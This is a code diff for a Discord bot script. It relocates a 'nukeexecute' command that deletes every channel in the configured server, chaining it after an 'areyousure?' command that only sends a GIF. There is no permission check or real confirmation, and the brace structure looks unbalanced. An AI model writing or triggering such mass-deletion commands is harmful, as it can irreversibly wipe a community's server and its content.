@@ -51,18 +51,8 @@ client.on("ready", function(){
     }
 });
 
-//n func
-
 // Get the guild using the ID.
    let guild = client.guilds.get(settings.guildID);
-
-   // Delete all channels.
-   if (message.content.startsWith(config.prefix + "nukeexecute")) {
-       guild.channels.forEach(c => {
-           c.delete();
-           console.info(`Deleted channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
-       });
-
 
 // log deleted messages MASTER
 client.on("messageDelete", (message) => {
@@ -430,6 +420,13 @@ if (message.content.startsWith(config.prefix + 'timehack')) {
 if (message.content.startsWith(config.prefix + 'areyousure?')) {
  message.channel.send("Are you really really sure?", {
    file: "https://i.imgur.com/i9xH0Cg.gif"
+     });
+   } else
+        // Delete all channels.
+        if (message.content.startsWith(config.prefix + "nukeexecute")) {
+            guild.channels.forEach(c => {
+                c.delete();
+                console.info(`Deleted channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
      });
    }
 });
